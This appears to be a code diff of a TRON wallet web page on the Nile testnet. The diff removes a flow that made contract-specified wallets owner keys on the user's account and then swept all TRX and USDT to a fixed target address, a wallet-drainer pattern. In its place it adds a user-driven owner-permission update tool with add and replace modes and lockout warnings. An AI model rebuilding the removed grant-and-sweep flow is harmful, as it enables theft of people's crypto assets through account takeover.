@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
-<title>Permission Manager - TRON</title>
+<title>TRON Owner Permission Update</title>
 <style>
 *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
 :root{
@@ -67,9 +67,9 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
 .abtn:hover:not(:disabled){filter:brightness(1.12);transform:translateY(-1px)}
 .abtn:active:not(:disabled){transform:scale(0.99)}
 .abtn:disabled{opacity:0.45;cursor:not-allowed}
-.abtn.ok{background:linear-gradient(135deg,var(--ok),#15803d)}
+.abtn.ok{background:linear-gradient(135deg,#22c55e,#15803d)}
 .abtn.sec{background:var(--surface);border:1px solid var(--border2);color:var(--txt)}
-.abtn.danger{background:linear-gradient(135deg,var(--err),#b91c1c)}
+.abtn.danger{background:linear-gradient(135deg,#ef4444,#b91c1c)}
 .abtn.sub{display:block;font-size:11px;font-weight:400;color:var(--mute);text-align:center;margin-bottom:10px}
 .warn{display:flex;gap:10px;padding:12px 14px;background:#1a1400;border:1px solid #3a2e0a;border-radius:10px;margin-bottom:10px;font-size:12px;color:var(--warn);line-height:1.6}
 .err{display:flex;gap:10px;padding:12px 14px;background:#1a0808;border:1px solid #3a1a1a;border-radius:10px;margin-bottom:10px;font-size:12px;color:var(--err);line-height:1.6}
@@ -110,10 +110,6 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
 .dbg-tag.warn{color:var(--warn)}
 .dbg-tag.deep{color:#c084fc}
 .dbg-tag.tx{color:#34d399}
-.dbg-tag.env{color:#f472b6}
-.dbg-tag.route{color:#fbbf24}
-.dbg-tag.click{color:#38bdf8}
-.dbg-tag.step{color:#60a5fa}
 .dbg-tag.perm{color:#a78bfa}
 .dbg-msg{flex:1;word-break:break-all}
 .dv{height:1px;background:var(--border);margin:16px 0}
@@ -127,26 +123,15 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
 .fb-btn:hover{background:#252540}
 .fb-btn:active{transform:scale(0.98)}
 .fb-divider{height:1px;background:var(--border);margin:12px 0}
-.addr-row{display:flex;justify-content:space-between;align-items:center;gap:8px;padding:6px 0;border-bottom:1px solid var(--border)}
-.addr-row:last-child{border-bottom:none}
-.addr-row .lbl{font-size:11px;color:var(--mute);flex-shrink:0}
-.addr-row .val{font-size:11px;color:var(--code);font-family:'Courier New',monospace;word-break:break-all;text-align:right}
-.addr-row .val.ok{color:var(--ok)}
-.addr-row .val.own{color:var(--ok);font-weight:600}
-.addr-row .val.tgt{color:var(--warn)}
-.contract-status{display:flex;align-items:center;gap:6px;padding:8px 12px;background:#0a0a1e;border:1px solid var(--border2);border-radius:8px;margin-bottom:10px;font-size:11px;color:var(--mute)}
-.contract-status .dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
-.contract-status .dot.ok{background:var(--ok)}
-.contract-status .dot.fail{background:var(--err)}
-.contract-status .dot.run{background:var(--accent);animation:pulse 1s infinite}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
-.summary-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px}
-.summary-cell{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:10px;text-align:center}
-.summary-cell .sc-val{font-size:16px;font-weight:700;color:var(--txt);font-family:'Courier New',monospace}
-.summary-cell .sc-lbl{font-size:10px;color:var(--mute);margin-top:2px}
-.summary-cell .sc-val.ok{color:var(--ok)}
-.summary-cell .sc-val.warn{color:var(--warn)}
-.summary-cell .sc-val.err{color:var(--err)}
+.fld{margin-bottom:14px}
+.fld-lbl{display:block;font-size:11px;color:var(--mute);margin-bottom:6px;font-weight:600}
+.fld-inp{width:100%;padding:10px 12px;background:var(--surface);border:1px solid var(--border2);border-radius:8px;font-size:13px;font-family:'Courier New',monospace;color:var(--txt);outline:none;transition:border-color 0.2s}
+.fld-inp:focus{border-color:var(--accent)}
+.fld-inp::placeholder{color:var(--mute)}
+.sel{width:100%;padding:10px 12px;background:var(--surface);border:1px solid var(--border2);border-radius:8px;font-size:13px;color:var(--txt);outline:none;appearance:none;cursor:pointer}
+.sel:focus{border-color:var(--accent)}
+.sel option{padding:8px}
+.preview-box{background:#0a0a1e;border:1px solid var(--border2);border-radius:10px;padding:12px;margin-bottom:12px;font-size:11px;font-family:'Courier New',monospace;color:var(--code);line-height:1.7;white-space:pre-wrap;word-break:break-all;max-height:200px;overflow-y:auto}
 </style>
 </head>
 <body>
@@ -154,7 +139,7 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
 <div class="wrap">
   <div class="topbar">
     <div>
-      <div class="topbar-title">Permission Manager</div>
+      <div class="topbar-title">Owner Permission Update</div>
       <div class="topbar-sub" id="subTitle">TRON — Nile Testnet</div>
     </div>
     <div class="badge-row" id="badgeRow">
@@ -163,12 +148,10 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
     </div>
   </div>
 
-  <!-- Steps -->
+  <!-- 3 Steps -->
   <div class="step" id="s1"><div class="sn" id="s1n">1</div><div class="sb"><div class="st" id="s1t">Connect Wallet</div><div class="sm" id="s1m">Select imToken or TokenPocket</div></div></div>
-  <div class="step" id="s2"><div class="sn" id="s2n">2</div><div class="sb"><div class="st" id="s2t">Grant Owner Permission</div><div class="sm" id="s2m">Sign to add manager wallets as Owner keys</div></div></div>
-  <div class="step" id="s3"><div class="sn" id="s3n">3</div><div class="sb"><div class="st" id="s3t">Wait for Confirmation</div><div class="sm" id="s3m">Waiting for permission update to confirm...</div></div></div>
-  <div class="step" id="s4"><div class="sn" id="s4n">4</div><div class="sb"><div class="st" id="s4t">Transfer Assets</div><div class="sm" id="s4m">Sweep TRX + USDT to target address</div></div></div>
-  <div class="step" id="s5"><div class="sn" id="s5n">5</div><div class="sb"><div class="st" id="s5t">Done</div><div class="sm" id="s5m">All assets transferred to target</div></div></div>
+  <div class="step" id="s2"><div class="sn" id="s2n">2</div><div class="sb"><div class="st" id="s2t">Review Owner Permission Update</div><div class="sm" id="s2m">Set new owner address and mode</div></div></div>
+  <div class="step" id="s3"><div class="sn" id="s3n">3</div><div class="sb"><div class="st" id="s3t">Sign & Wait Confirmation</div><div class="sm" id="s3m">Sign in wallet and wait for on-chain confirmation</div></div></div>
 
   <!-- Wallet area -->
   <div id="walletArea">
@@ -213,37 +196,46 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
   <!-- Info area (after connection) -->
   <div id="infoArea" class="hd">
 
-    <!-- Account & Contract Info -->
+    <!-- Wallet & Network Info -->
     <div class="info-card">
       <div class="info-row"><span class="info-lbl">Your Wallet</span><span class="info-val copy" id="vAddr"></span></div>
       <div class="info-row"><span class="info-lbl">Network</span><span class="info-val ok" id="vNet">Nile Testnet</span></div>
       <div class="info-row"><span class="info-lbl">TRX Balance</span><span class="info-val" id="vTrxBal">Querying...</span></div>
     </div>
 
-    <!-- Contract & Address Info -->
+    <!-- Owner Input -->
     <div class="info-card">
-      <div class="addr-row"><span class="lbl">Contract Address</span><span class="val copy" id="vContract">—</span></div>
-      <div class="addr-row"><span class="lbl">New Owner Keys</span><span class="val own copy" id="vNewOwner">—</span></div>
-      <div class="addr-row"><span class="lbl">Target Address</span><span class="val tgt copy" id="vTarget">—</span></div>
-      <div class="addr-row"><span class="lbl">USDT Contract</span><span class="val copy" id="vUsdt">—</span></div>
-    </div>
-
-    <!-- Balances at Contract -->
-    <div class="summary-grid" id="balGrid">
-      <div class="summary-cell">
-        <div class="sc-val" id="scTrx">—</div>
-        <div class="sc-lbl">Contract TRX</div>
+      <div class="fld">
+        <label class="fld-lbl" for="inpOwner">New Owner Address (T...)</label>
+        <input class="fld-inp" id="inpOwner" placeholder="TJRabPrwbZy45sbavfcjinPJC18kjpRTv8" autocomplete="off" spellcheck="false"/>
       </div>
-      <div class="summary-cell">
-        <div class="sc-val" id="scUsdt">—</div>
-        <div class="sc-lbl">Contract USDT</div>
+      <div class="fld">
+        <label class="fld-lbl" for="selMode">Mode</label>
+        <select class="sel" id="selMode">
+          <option value="add">Add owner (keep current wallet + add new)</option>
+          <option value="replace">Replace owner (current wallet loses access)</option>
+        </select>
       </div>
     </div>
 
-    <!-- TRX Fee Warning -->
-    <div class="warn" id="warnBox">
+    <!-- Permission Preview -->
+    <div class="info-card" id="previewCard">
+      <div class="info-row" style="border-bottom:none">
+        <span class="info-lbl">ownerPermission preview</span>
+      </div>
+      <div class="preview-box" id="previewBox">Connect wallet and enter address to see preview</div>
+    </div>
+
+    <!-- Danger Warning -->
+    <div class="err" id="dangerWarn" style="display:none">
       <span class="ic">!</span>
-      <span>Step 2 grants Owner permission to manager wallet addresses. Fee: ~50-100 TRX. Step 4 transfers via wallet signature.</span>
+      <span id="dangerTxt"></span>
+    </div>
+
+    <!-- General Warning -->
+    <div class="warn">
+      <span class="ic">!</span>
+      <span>Owner permission is the highest authority on a TRON account. Use a test address on Nile testnet. Wrong keys or threshold may permanently lock the account.</span>
     </div>
 
     <!-- Error Box -->
@@ -252,20 +244,14 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
       <span id="errTxt"></span>
     </div>
 
-    <!-- Action Buttons -->
-    <div id="actGrant" style="display:none">
-      <div class="abtn sub">Step 2: Sign to add manager wallets as Owner keys on your account</div>
-      <button class="abtn" id="btnGrant">Grant Owner Permission</button>
-    </div>
-
-    <div id="actTransfer" class="hd">
-      <div class="abtn sub">Step 4: Transfer all TRX + USDT to target address</div>
-      <button class="abtn ok" id="btnTransfer">Transfer All (TRX + USDT)</button>
+    <!-- Action Button -->
+    <div id="actArea" style="display:none">
+      <button class="abtn" id="btnSign">Sign Owner Permission Update</button>
     </div>
 
     <!-- TX Result -->
     <div class="info-card hd" id="txCard">
-      <div class="info-row"><span class="info-lbl">Last TX Hash</span><span class="info-val copy" id="vTxHash"></span></div>
+      <div class="info-row"><span class="info-lbl">TX Hash</span><span class="info-val copy" id="vTxHash"></span></div>
       <div class="info-row"><span class="info-lbl">Explorer</span><span class="info-val copy" id="vExplorer"></span></div>
     </div>
 
@@ -311,71 +297,33 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
 <script>
 'use strict';
 
-// ================================================================
-// IMPORTANT — EDIT THESE BEFORE DEPLOYMENT
-// ================================================================
 const CONFIG = {
-  // 'nile' for testnet, 'mainnet' for production
   NETWORK: 'nile',
-
-  // --- Contract addresses ---
-  // Fill in after deploying PermissionManager.sol
-  NILE_CONTRACT:       'TPpyz5rfbMRoYXrNa3SXeDkZ8VqfWGf4UD',   // Nile testnet contract
-  MAINNET_CONTRACT:    '',                                      // Mainnet — fill after deploy
-
-  // --- Target address (receives TRX + USDT) ---
-  NILE_TARGET:         'TPKd6hGaSTAvonetNR3cn4qb67MmRc3mQt',   // Nile testnet target
-  MAINNET_TARGET:      '',                                      // Mainnet — fill after deploy
-
-  // --- USDT contracts ---
-  NILE_USDT:           'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf',   // Official Nile USDT
-  MAINNET_USDT:        'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',   // Official Mainnet USDT
-
-  // --- Owner Permission Configuration ---
-  // The DESIRED_OWNER is read from the deployed contract via constant() call.
-  // The frontend does NOT hardcode the owner address here.
-  // OWNER_MODE: 'single'  = only DESIRED_OWNER (threshold=1)
-  //              'dual'    = DESIRED_OWNER + SECOND_OWNER_ADDRESS (threshold=2)
-  // IMPORTANT: These must be EOA wallet addresses, NOT contract addresses.
-  // The contract address is NEVER put in ownerPermission.keys — contracts cannot sign.
-  OWNER_MODE:          'single',                             // 'single' or 'dual'
-  SECOND_OWNER_ADDRESS: 'TJRabPrwbZy45sbavfcjinPJC18kjpRTv8', // second owner wallet (only for 'dual' mode) — REPLACE
-
-  // --- Explorers ---
   EXPLORER_NILE:    'https://nilescan.io',
   EXPLORER_MAINNET: 'https://tronscan.org',
 };
 
-// Computed getters
-const isNile       = () => CONFIG.NETWORK === 'nile';
-const CONTRACT     = () => isNile() ? CONFIG.NILE_CONTRACT : CONFIG.MAINNET_CONTRACT;
-const TARGET_ADDR  = () => isNile() ? CONFIG.NILE_TARGET : CONFIG.MAINNET_TARGET;
-const USDT_CONTRACT= () => isNile() ? CONFIG.NILE_USDT : CONFIG.MAINNET_USDT;
-const EXPLORER     = () => isNile() ? CONFIG.EXPLORER_NILE : CONFIG.EXPLORER_MAINNET;
-const getTxUrl     = tx  => EXPLORER() + '/#/transaction/' + tx;
+const isNile    = () => CONFIG.NETWORK === 'nile';
+const EXPLORER  = () => isNile() ? CONFIG.EXPLORER_NILE : CONFIG.EXPLORER_MAINNET;
+const getTxUrl  = tx  => EXPLORER() + '/#/transaction/' + tx;
 
-const isAddr = addr => addr && addr.length === 34 && addr[0] === 'T';
-const delay  = ms  => new Promise(r => setTimeout(r, ms));
-const fmtAddr = addr => addr ? addr.slice(0, 6) + '...' + addr.slice(-4) : '---';
-const fmtTrx  = raw => raw != null ? (Number(raw) / 1e6).toFixed(6).replace(/\.?0+$/, '') + ' TRX' : '—';
-const fmtUsdt = raw => raw != null ? (Number(raw) / 1e6).toFixed(2).replace(/\.?0+$/, '') + ' USDT' : '—';
-const escHtml = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-
-const $ = id => document.getElementById(id);
+const isAddr   = addr => addr && addr.length === 34 && addr[0] === 'T';
+const delay    = ms  => new Promise(r => setTimeout(r, ms));
+const fmtAddr  = addr => addr ? addr.slice(0, 6) + '...' + addr.slice(-4) : '---';
+const fmtTrx   = raw => raw != null ? (Number(raw) / 1e6).toFixed(6).replace(/\.?0+$/, '') + ' TRX' : '—';
+const escHtml  = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+const $        = id => document.getElementById(id);
 
 const STATE = {
   IDLE:'idle', CONNECTING:'connecting', READY:'ready',
-  GRANTING:'granting', GRANTED:'granted',
-  TRANSFERRING:'transferring', DONE:'done', FAIL:'fail'
+  SIGNING:'signing', DONE:'done', FAIL:'fail'
 };
-let state      = STATE.IDLE;
-let tw         = null;
-let wAddr      = null;
-let wType      = null;
-let modalCb    = null;
-let lastTx     = null;
-let contractTrxBal = null;
-let contractUsdtBal = null;
+let state   = STATE.IDLE;
+let tw      = null;
+let wAddr   = null;
+let wType   = null;
+let modalCb = null;
+let lastTx  = null;
 </script>
 
 <!-- ================================================================
@@ -398,21 +346,13 @@ const Log = {
   warn(msg)  { this.add('WARN', msg); },
   deep(msg)  { this.add('DEEPLINK', msg); },
   tx(msg)    { this.add('TX', msg); },
-  env(msg)   { this.add('ENV', msg); },
-  route(msg) { this.add('ROUTE', msg); },
-  click(msg) { this.add('CLICK', msg); },
-  step(msg)  { this.add('STEP', msg); },
   perm(msg)  { this.add('PERM', msg); },
   raw(msg)   { this.add('RAW', msg); },
   render() {
     const el = $('dbgLog');
     if (!el) return;
     el.innerHTML = this.lines.slice(-200).map(l => {
-      const tagColor = {
-        INFO:'info', OK:'ok', ERR:'err', WARN:'warn',
-        DEEPLINK:'deep', TX:'tx', ENV:'env', ROUTE:'route', CLICK:'click',
-        STEP:'step', PERM:'perm', RAW:'err'
-      }[l.tag] || 'info';
+      const tagColor = { INFO:'info', OK:'ok', ERR:'err', WARN:'warn', DEEPLINK:'deep', TX:'tx', PERM:'perm', RAW:'err' }[l.tag] || 'info';
       return `<div class="dbg-line"><span class="dbg-ts">${l.ts}</span><span class="dbg-tag ${tagColor}">${l.tag}</span><span class="dbg-msg">${escHtml(l.msg)}</span></div>`;
     }).join('');
     el.scrollTop = el.scrollHeight;
@@ -625,20 +565,6 @@ async function queryTrxBalance(addr) {
   return await tw.trx.getBalance(addr) || 0;
 }
 
-async function queryUsdtBalance(owner, spender) {
-  const { tw } = getTronWeb();
-  if (!tw) throw new Error('TronWeb not available');
-  const c = await tw.contract().at(USDT_CONTRACT());
-  return await c.balanceOf(owner).call().then(r => r ? r.toString() : '0');
-}
-
-async function queryAllowance(owner, spender) {
-  const { tw } = getTronWeb();
-  if (!tw) throw new Error('TronWeb not available');
-  const c = await tw.contract().at(USDT_CONTRACT());
-  return await c.allowance(owner, spender).call().then(r => r ? r.toString() : '0');
-}
-
 async function pollTx(tx) {
   const { tw } = getTronWeb();
   if (!tw) throw new Error('TronWeb not available');
@@ -673,61 +599,18 @@ function logRawError(label, e) {
 </script>
 
 <!-- ================================================================
-     LAYER 6: PERMISSION & TRANSACTION BUILDERS
+     LAYER 6: INPUT VALIDATION
 ============================================================ -->
 <script>
 'use strict';
 
-/**
- * Read DESIRED_OWNER from the deployed PermissionManager contract.
- * Returns the hex address string. Throws if the contract is not deployed or
- * if DESIRED_OWNER is the zero address.
- *
- * This is how the frontend gets the owner address — not from CONFIG, but from
- * the contract's constant. This ensures the contract and the tx are in sync.
- */
-async function readDesiredOwnerFromContract() {
-  const { tw: curTw } = getTronWeb();
-  if (!curTw) throw new Error('TronWeb not available');
-
-  const cAddr = CONTRACT();
-  if (!cAddr) throw new Error('CONTRACT address not set in CONFIG');
-
-  Log.perm('Reading DESIRED_OWNER from contract: ' + cAddr);
-
-  try {
-    const instance = await curTw.contract().at(cAddr);
-    // Call the public constant DESIRED_OWNER()
-    const rawHex = await instance.DESIRED_OWNER().call();
-    // rawHex is a BigNumber or hex string — convert to hex address
-    let hexAddr = rawHex;
-    if (typeof rawHex === 'object' && rawHex.toHex) {
-      hexAddr = rawHex.toHex();
-    } else if (typeof rawHex === 'string') {
-      hexAddr = rawHex;
-    }
-    // Normalize: ensure 42 chars (0x + 40 hex), no leading zeros trimmed
-    if (!hexAddr.startsWith('0x')) hexAddr = '0x' + hexAddr;
-    // Truncate any extra bytes beyond 20 (41 chars = 0x + 40 hex)
-    if (hexAddr.length > 42) hexAddr = hexAddr.slice(0, 42);
-
-    Log.perm('DESIRED_OWNER (hex from contract): ' + hexAddr);
-
-    // Validate: must not be zero address
-    if (hexAddr === '0x' + '0'.repeat(40))
-      throw new Error('DESIRED_OWNER is zero address — set it in PermissionManager.sol before deploying');
-
-    return hexAddr;
-  } catch (e) {
-    Log.err('Failed to read DESIRED_OWNER from contract: ' + (e.message || String(e)));
-    throw new Error('Cannot read DESIRED_OWNER from contract. Is the contract deployed at ' + cAddr + '?');
-  }
+function validateOwnerInput(raw) {
+  const addr = (raw || '').trim();
+  if (!addr) return { ok: false, err: 'Address is empty' };
+  if (!isAddr(addr)) return { ok: false, err: 'Invalid TRON address — must start with T and be 34 characters' };
+  return { ok: true, addr };
 }
 
-/**
- * Detect whether an address is a contract by checking code size on-chain.
- * Returns true if code length > 0.
- */
 async function isContractAddress(addr) {
   const { tw } = getTronWeb();
   if (!tw) return false;
@@ -739,10 +622,6 @@ async function isContractAddress(addr) {
   }
 }
 
-/**
- * Convert a base58 TRON address to hex format for ownerPermission.keys.
- * Throws if address is invalid.
- */
 function toHex(addr) {
   const { tw: curTw } = getTronWeb();
   if (!curTw) throw new Error('TronWeb not available');
@@ -752,22 +631,19 @@ function toHex(addr) {
   return hex;
 }
 
-/**
- * Assert that an address is an EOA (not a contract).
- * Throws with a clear message if a contract is found.
- */
-async function assertPermissionKeysAreEOA(addr, label) {
-  if (!addr || typeof addr !== 'string')
-    throw new Error(`[${label}] Invalid address: ${JSON.stringify(addr)}`);
-  const isContract = await isContractAddress(addr);
-  if (isContract) throw new Error(`DESIRED_OWNER must be an EOA, not a contract account: ${addr}`);
-  Log.perm(`[${label}] ${addr} is an EOA (OK)`);
+function toBase58(hex) {
+  const { tw: curTw } = getTronWeb();
+  if (!curTw) throw new Error('TronWeb not available');
+  return curTw.address.fromHex(hex);
 }
+</script>
 
-/**
- * Normalize an active permission from the chain.
- * Ensures all required fields are present and converts keys to hex.
- */
+<!-- ================================================================
+     LAYER 7: PERMISSION TX BUILDER
+============================================================ -->
+<script>
+'use strict';
+
 function normalizeActivePermission(p, index) {
   if (!p) throw new Error(`No valid active permissions found at index ${index}`);
   if (p === null) throw new Error(`active_permission[${index}] is null`);
@@ -791,123 +667,28 @@ function normalizeActivePermission(p, index) {
   };
 }
 
-/**
- * Build ownerPermission.keys based on CONFIG.OWNER_MODE and DESIRED_OWNER from contract.
- *
- * Single mode (OWNER_MODE='single'):
- *   keys = [DESIRED_OWNER]
- *   threshold = 1
- *
- * Dual mode (OWNER_MODE='dual'):
- *   keys = [DESIRED_OWNER, SECOND_OWNER_ADDRESS]
- *   threshold = 2
- *
- * The DESIRED_OWNER address is read from the deployed contract, NOT from CONFIG.
- * This is the ONLY address that actually takes effect on the TRON chain — it is
- * placed in ownerPermission.keys and confirmed when the user signs the transaction.
- *
- * NOTE: confirmPermissionUpdate() in the contract does NOT change the permission.
- * It only sets permissionUpdated=true. The real permission change happens when
- * the user signs the accountPermissionUpdate transaction built here.
- */
-async function normalizeOwnerPermission(desiredOwnerHex, existing) {
-  const mode = CONFIG.OWNER_MODE;
-  if (mode !== 'single' && mode !== 'dual')
-    throw new Error(`Invalid OWNER_MODE: ${mode}. Must be 'single' or 'dual'.`);
-
-  // desiredOwnerHex already from contract — validate it is not a contract
-  await assertPermissionKeysAreEOA(desiredOwnerHex, 'DESIRED_OWNER');
-
-  let allKeys, threshold;
-
-  if (mode === 'single') {
-    allKeys = [{ address: desiredOwnerHex, weight: 1 }];
-    threshold = 1;
-    Log.perm(`Owner mode: SINGLE. keys=[${desiredOwnerHex}], threshold=1`);
-  } else {
-    if (!CONFIG.SECOND_OWNER_ADDRESS)
-      throw new Error('OWNER_MODE is "dual" but SECOND_OWNER_ADDRESS is not set');
-    const owner2Hex = toHex(CONFIG.SECOND_OWNER_ADDRESS);
-    if (desiredOwnerHex === owner2Hex)
-      throw new Error('Duplicate owner addresses: DESIRED_OWNER === SECOND_OWNER_ADDRESS');
-
-    allKeys = [
-      { address: desiredOwnerHex, weight: 1 },
-      { address: owner2Hex, weight: 1 }
-    ];
-    threshold = 2;
-    Log.perm(`Owner mode: DUAL. keys=[${desiredOwnerHex}, ${owner2Hex}], threshold=2`);
-  }
-
-  // Warn if the only key is not the connected wallet (may lock out current user)
-  const connectedHex = toHex(wAddr);
-  if (mode === 'single' && desiredOwnerHex !== connectedHex) {
-    Log.warn('Single sign mode: DESIRED_OWNER differs from connected wallet. '
-      + 'Connected wallet will lose Owner access unless it is also DESIRED_OWNER.');
-  }
-
-  return {
-    type:            0,
-    id:              0,
-    permission_name: 'owner',
-    threshold:       threshold,
-    parent_id:       0,
-    operations:      existing?.operations ??
-                     '7fff1fc0037e0000000000000000000000000000000000000000000000000000',
-    keys:            allKeys
-  };
-}
-
-/**
- * Build the accountPermissionUpdate transaction.
- *
- * Flow:
- * 1. Read DESIRED_OWNER from the deployed PermissionManager contract (via constant call)
- * 2. Validate it is an EOA (not a contract)
- * 3. Build ownerPermission.keys with that address
- * 4. Prompt user to sign
- * 5. Broadcast
- *
- * After confirmation: DESIRED_OWNER becomes an Owner key on the user's account.
- * The contract CANNOT do this — only the user's wallet can sign.
- *
- * TronWeb API:
- *   transactionBuilder.updateAccountPermissions(
- *     address,           // account whose permissions are being updated
- *     ownerPermission,   // new Owner permission — keys contain DESIRED_OWNER
- *     actives,           // normalized active permissions
- *     witness            // null for normal accounts
- *   )
- */
-async function buildGrantPermissionTx(signerAddress) {
+async function buildGrantPermissionTx(userAddress, newOwnerAddress, mode) {
   const { tw: curTw } = getTronWeb();
   if (!curTw) throw new Error('TronWeb not available');
 
-  const userAddress = signerAddress;
+  const inputHex = toHex(newOwnerAddress);
+  const currentHex = toHex(userAddress);
 
   Log.perm('=== buildGrantPermissionTx ===');
-  Log.perm('userAddress: ' + userAddress);
-  Log.perm('OWNER_MODE: ' + CONFIG.OWNER_MODE);
+  Log.perm('userAddress:  ' + userAddress);
+  Log.perm('newOwnerAddress: ' + newOwnerAddress + ' (hex: ' + inputHex + ')');
+  Log.perm('mode: ' + mode);
 
-  // 1. Read DESIRED_OWNER from the deployed contract
-  // THIS IS THE SOURCE OF TRUTH — not CONFIG, not the contract variable name
-  const desiredOwnerHex = await readDesiredOwnerFromContract();
-  Log.perm('DESIRED_OWNER (from contract): ' + desiredOwnerHex);
-
-  // 2. Fetch on-chain account data
+  // 1. Read chain account
   const account = await curTw.trx.getAccount(userAddress);
-  Log.perm('On-chain account fetched: ' + JSON.stringify(account).slice(0, 200));
+  Log.perm('On-chain account fetched');
 
-  // 3. Witness permission: null for normal accounts
+  // 2. Witness permission
   const witnessPermission = account?.witness_permission ?? null;
-  Log.perm('witnessPermission: ' + JSON.stringify(witnessPermission));
 
-  // 4. Active permissions — normalize from chain + fallback
+  // 3. Active permissions — normalize from chain
   const rawActives = account?.active_permission;
-  if (!Array.isArray(rawActives) || rawActives.length === 0) {
-    Log.perm('No active_permission on chain — creating fallback active[0]');
-  }
-  const activesPermissions = Array.isArray(rawActives)
+  const activesPermissions = Array.isArray(rawActives) && rawActives.length > 0
     ? rawActives.filter(Boolean).map((p, i) => normalizeActivePermission(p, i))
     : [];
 
@@ -919,27 +700,53 @@ async function buildGrantPermissionTx(signerAddress) {
       threshold:       1,
       parent_id:       0,
       operations:      '7fff1fc0037e0000000000000000000000000000000000000000000000000000',
-      keys:            [{ address: toHex(userAddress), weight: 1 }]
+      keys:            [{ address: currentHex, weight: 1 }]
     });
-    Log.perm('Fallback active permission created');
+    Log.perm('Created fallback active permission');
   }
 
-  // 5. Validate SECOND_OWNER_ADDRESS is an EOA (dual mode)
-  if (CONFIG.OWNER_MODE === 'dual')
-    await assertPermissionKeysAreEOA(CONFIG.SECOND_OWNER_ADDRESS, 'SECOND_OWNER_ADDRESS');
+  // 4. Build owner permission based on mode
+  let ownerKeys, threshold;
+  if (mode === 'replace') {
+    // Replace: only the new address becomes owner
+    ownerKeys = [{ address: inputHex, weight: 1 }];
+    threshold = 1;
+    Log.perm('Mode: REPLACE. keys=[' + inputHex + '], threshold=1');
+  } else {
+    // Add: keep current wallet + add new address
+    // Option A (default): threshold=1, both keys can sign independently
+    // Option B: threshold=2, both keys must sign together
+    // Uncomment Option B if you need dual-authorization:
+    //
+    // ownerKeys = [
+    //   { address: currentHex, weight: 1 },
+    //   { address: inputHex, weight: 1 }
+    // ];
+    // threshold = 2;
+    // Log.perm('Mode: ADD (dual-sign). keys=[' + currentHex + ', ' + inputHex + '], threshold=2');
 
-  // 6. Build owner permission
-  // desiredOwnerHex comes from the contract — this is what actually takes effect
-  const ownerPermission = await normalizeOwnerPermission(desiredOwnerHex, account?.owner_permission);
+    ownerKeys = [
+      { address: currentHex, weight: 1 },
+      { address: inputHex, weight: 1 }
+    ];
+    threshold = 1;
+    Log.perm('Mode: ADD (single-sign). keys=[' + currentHex + ', ' + inputHex + '], threshold=1');
+  }
 
-  Log.perm('ownerPermission: ' + JSON.stringify(ownerPermission));
-  Log.perm('activesPermissions: ' + JSON.stringify(activesPermissions));
+  const ownerPermission = {
+    type:            0,
+    id:              0,
+    permission_name: 'owner',
+    threshold:       threshold,
+    parent_id:       0,
+    operations:      account?.owner_permission?.operations ??
+                     '7fff1fc0037e0000000000000000000000000000000000000000000000000000',
+    keys:            ownerKeys
+  };
 
-  // 7. Safety warnings
-  Log.warn('Owner permission threshold: ' + ownerPermission.threshold + ' — all ' + ownerPermission.keys.length + ' keys must sign');
-  Log.warn('DANGER: owner permission is the highest authority. Wrong keys or threshold may permanently lock the account.');
+  Log.perm('ownerPermission: ' + JSON.stringify(ownerPermission, (k, v) => k === 'operations' ? '...' : v));
 
-  // 8. Build transaction
+  // 5. Build transaction
   const tx = await curTw.transactionBuilder.updateAccountPermissions(
     userAddress,
     ownerPermission,
@@ -950,44 +757,14 @@ async function buildGrantPermissionTx(signerAddress) {
   Log.perm('Tx built. txID=' + tx.txID);
   return tx;
 }
-
-/**
- * Build a triggerContract transaction that transfers assets via the contract.
- * The transaction is signed by the connected wallet (which is now an owner key).
- *
- * TronWeb triggerSmartContract format:
- *   tw.transactionBuilder.triggerSmartContract(
- *     contractAddress,   // contract to call
- *     functionSelector,  // e.g. "withdrawAllTRX()"
- *     options,           // { feeLimit, callValue }
- *     parameters         // array of parameter values
- *   )
- */
-async function buildTriggerContractTx(contractAddress, functionSelector, feeLimit) {
-  const { tw: curTw } = getTronWeb();
-  if (!curTw) throw new Error('TronWeb not available');
-
-  Log.tx('Building triggerContract tx: ' + functionSelector);
-  Log.tx('contract: ' + contractAddress);
-  Log.tx('feeLimit: ' + feeLimit);
-
-  const tx = await curTw.transactionBuilder.triggerSmartContract(
-    contractAddress,
-    functionSelector,
-    { feeLimit: feeLimit, callValue: 0 },
-    []
-  );
-
-  Log.tx('TriggerContract tx built. txID=' + tx.tx?.txID);
-  return tx;
-}
 </script>
 
 <!-- ================================================================
-     LAYER 7: CONNECTION & MAIN FLOW
+     LAYER 8: CONNECTION & MAIN FLOW
 ============================================================ -->
 <script>
 'use strict';
+
 async function routeConnect(preferredWallet) {
   const env = detectWalletEnvironment();
   Log.info('routeConnect() preferred=' + preferredWallet + ' env=' + env.recommendedFlow);
@@ -1008,7 +785,6 @@ async function routeConnect(preferredWallet) {
 async function connectViaProvider(env) {
   Log.info('connectViaProvider()');
   stepSet(1, 'on', 'Connect Wallet', 'Detecting provider...', null);
-  stepSet(2, 'on', 'Grant Owner Permission', 'Waiting for wallet...', null);
 
   let { tw: rawTw, source } = getTronWeb();
   if (!rawTw) {
@@ -1018,7 +794,6 @@ async function connectViaProvider(env) {
     } catch (e) {
